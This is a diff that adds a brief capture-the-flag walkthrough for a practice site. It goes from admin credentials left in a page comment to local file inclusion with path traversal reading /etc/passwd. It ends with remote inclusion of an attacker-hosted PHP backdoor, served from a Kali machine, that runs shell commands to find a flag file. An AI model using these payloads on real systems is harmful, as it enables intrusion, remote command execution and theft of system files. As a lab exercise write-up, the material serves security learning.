@@ -1,0 +1,16 @@
+website: www.breakthecode.com
+clue: Dev has forgotten to delete a comment from login page 
+
+task: Find the file Flag.txt and get the code. 
+
+procedure: 
+1. as clue says go to the login page and inspect element
+2. get the clue if its helpful 
+    as its helpful and gives login credentials of admin 
+3. Login 
+   Next LFI:
+4. go to http://www.breakthecodeee.com/1/btc/?page=../../../../../../etc/passwd
+5. now the application is LFI vulnerable now, 
+    go to /usr/share/webshells/php
+    start a server 'python -m SimpleHTTPServer 8000'
+6. http://www.breakthecodeee.com/1/btc/?page=http://kali-tunnel-ip:8000/simple-backdoor.php&cmd=locate+Flag.txt
